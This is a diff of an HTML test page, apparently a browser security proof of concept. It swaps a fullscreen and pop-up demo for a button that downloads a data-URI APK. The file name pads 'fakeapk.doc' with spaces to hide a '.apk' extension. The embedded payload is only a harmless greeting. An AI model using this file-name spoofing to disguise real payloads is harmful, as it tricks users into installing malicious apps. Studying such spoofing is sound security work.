@@ -1,32 +1,19 @@
-<!DOCTYPE html>
-<body>
-<script>
-var popupwindow;
-function toggleFullScreen() {
-  if (!document.webkitFullscreenElement && !document.mozFullScreenElement) {
-    if (document.documentElement.webkitRequestFullscreen) {
-      document.documentElement.webkitRequestFullscreen();
-    }
-    if (document.documentElement.mozRequestFullScreen) {
-      document.documentElement.mozRequestFullScreen();
-    }
-  } else {
-    if (document.webkitExitFullscreen) {
-      document.webkitExitFullscreen(); 
-    }
-    if (document.mozCancelFullScreen) {
-      document.mozCancelFullScreen(); 
-    }
-  }
+<script language="javascript">
+function Puf(uri, name) {
+  var link = document.createElement("a");
+  link.download = name;
+  link.href = uri;
+  link.click();
+  
 }
-function makePopUp() {
-  popupwindow = window.open('about:blank','','height=1,width=500,top=0,left=700');
+function openWin()
+{
+
+Puf("data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=", "fakeapk.doc                                                            ['hacked link download  attacker.com.apk")
+
 }
-function focusPopUp() {
-  popupwindow.focus();
-}
+
 </script>
-<button onclick="toggleFullScreen();">Toggle fullscreen</button>
-<button onclick="makePopUp();">Make pop-up</button>
-<button onclick="focusPopUp();">Focus pop-up</button>
-</body>
+<center><h2>Peace Be Upon You</h2></center>
+
+<input type="button"  onclick="openWin();" value="open"/>
